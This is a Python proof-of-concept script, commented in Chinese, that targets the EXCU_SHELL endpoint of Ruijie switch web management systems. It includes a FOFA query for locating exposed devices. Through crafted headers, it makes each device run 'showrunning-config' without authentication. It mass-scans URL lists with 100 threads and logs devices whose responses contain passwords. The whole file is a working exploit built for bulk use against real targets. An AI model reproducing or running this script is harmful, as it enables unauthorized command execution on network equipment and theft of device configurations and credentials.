#锐捷交换机WEB管理系统EXCU_SHELL信息泄露
#fofa:body="img/free_login_ge.gif" && body="./img/login_bg.gif"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

███████╗██╗  ██╗ ██████╗██╗   ██╗        ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔════╝╚██╗██╔╝██╔════╝██║   ██║        ██╔════╝██║  ██║██╔════╝██║     ██║     
█████╗   ╚███╔╝ ██║     ██║   ██║        ███████╗███████║█████╗  ██║     ██║     
██╔══╝   ██╔██╗ ██║     ██║   ██║        ╚════██║██╔══██║██╔══╝  ██║     ██║     
███████╗██╔╝ ██╗╚██████╗╚██████╔╝███████╗███████║██║  ██║███████╗███████╗███████╗
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                 
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="锐捷交换机WEB管理系统EXCU_SHELL信息泄露")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/EXCU_SHELL"
    headers = {
        'Cmdnum':'1',
        'Command1':'showrunning-config',
        'Confirm1':'n',
        'User-Agent':'Java/1.8.0_381',
        'Accept':'text/html,image/gif,image/jpeg,*;q=.2,*/*;q=.2',
        'Connection':'close',
    }
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,proxies=proxies)
        if res1.status_code==200 and 'password' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()